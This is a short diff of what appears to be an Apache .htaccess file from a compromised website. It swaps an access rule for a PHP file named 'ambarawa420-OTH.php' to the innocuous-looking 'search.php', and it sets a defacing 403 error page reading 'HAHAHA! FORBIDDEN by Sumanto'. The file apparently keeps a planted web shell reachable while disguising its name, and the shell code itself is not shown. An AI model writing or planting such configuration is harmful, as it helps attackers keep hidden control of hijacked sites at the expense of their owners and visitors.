@@ -58,9 +58,10 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(ambarawa420-OTH.php)$">
+<FilesMatch "^(search.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
 Options -Indexes
+
 ErrorDocument 403 '<center><img src="https://res.cloudinary.com/dqkin28uq/image/upload/v1755114959/tenor_kvlz1z.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by Sumanto</h2>
